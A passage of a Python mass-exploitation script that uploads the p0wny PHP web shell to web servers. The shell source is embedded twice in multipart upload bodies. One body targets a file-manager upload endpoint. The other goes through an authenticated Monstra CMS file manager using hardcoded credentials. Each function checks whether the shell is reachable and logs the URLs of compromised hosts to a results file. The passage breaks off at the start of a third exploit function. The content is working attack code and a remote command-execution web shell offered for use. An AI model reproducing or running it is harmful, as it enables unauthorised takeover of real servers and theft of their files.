        data = "\r\n\r\n\r\n-----------------------------289777152427948045812862014674\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xc3\xa2\xc2\x80\xc2\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------289777152427948045812862014674--\r\n"

        #Construct link and posting request which will upload the file:
        link_exploit = link_base + '/components/filemanager/controller.php?action=upload&path=/var/www/html/data/' + "exploitdev"
        exploit = requests.post(link_exploit, headers=header, data=data, timeout=20, verify=False)
        time.sleep(2)
        checkShell2 = f" http://{domain}:80//data/exploitdev/shell.php'"
        check = requests.get(checkShell2, headers=ua, timeout=10, verify=False).text
        if "<title>p0wny@shell:~#" in check:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #3 -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{checkShell2}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #3 -->> {red}Failed Exploit !")
    except:pass

def WpEx4(domain):
    try:
        target_ip = domain
        target_port = "80"
        Monstracms_path = "/monstra-3.0.4/"
        username = "AXVTECH666"
        password = "AXVTECH666PASS@#"

        # Cookies:
        session = requests.Session()
        url = "http://" + target_ip + ':' + target_port + Monstracms_path + 'admin/index.php'
        cookies = session.get(url, headers=ua).cookies.get_dict()
        value = cookies['PHPSESSID']
        cookies = {
            "__atuvc": "9%7C22",
            'PHPSESSID': 'sga7s1jb0o3b7dlueh5soin8a9'
        }

        # Construct authentication header:
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "http://" + target_ip,
            "Connection": "close",
            "Referer": "http://" + target_ip + ':' + target_port + Monstracms_path + 'admin/index.php',
            "Upgrade-Insecure-Requests": "1"}

        # Construct authentication body
        body = {
            "login": username,
            "password": password,
            "login_submit": "Log In"}
        x = requests.post(url, headers=headers, cookies=cookies, data=body,verify=False)

        # Construct Exploit link:
        url = "http://" + target_ip + ':' + target_port + Monstracms_path + 'admin/index.php?id=filesmanager'

        # Construct Exploit header:
        header = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "multipart/form-data; boundary=---------------------------27822155982314896762160847658",
            "Origin": "http://" + target_ip,
            "Connection": "close",
            "Referer": "http://" + target_ip + Monstracms_path + 'admin/index.php?id=filesmanager',
            "Upgrade-Insecure-Requests": "1"
        }

        # Construct Exploit data:
        burp0_data = "-----------------------------27822155982314896762160847658\r\nContent-Disposition: form-data; name=\"csrf\"\r\n\r\n1e71963993909d612c40962b401c556b70e9bb3c\r\n-----------------------------27822155982314896762160847658\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.phar\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------27822155982314896762160847658\r\nContent-Disposition: form-data; name=\"upload_file\"\r\n\r\nUpload\r\n-----------------------------27822155982314896762160847658--\r\n"

        # Exploit:
        x = requests.post(url, headers=header, cookies=cookies, data=burp0_data, verify=False)
        shell = 'http://' + target_ip + ':' + target_port + Monstracms_path + 'public/uplaods/shell.phar'
        check = requests.get(shell, headers=ua, timeout=10,verify=False).text
        if "<title>p0wny@shell:~#" in check:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #4 -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{shell}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #4 -->> {red}Failed Exploit !")
    except:pass



def WpEx5(domain):
    try:
        target_ip = domain
        target_port = "80"
        password = "AXVTECH666PASS@#"
        pluckcmspath = "Exploiterdev"

        session = requests.Session()
        link = 'http://' + target_ip + ':' + target_port + pluckcmspath
        response = session.get(link)
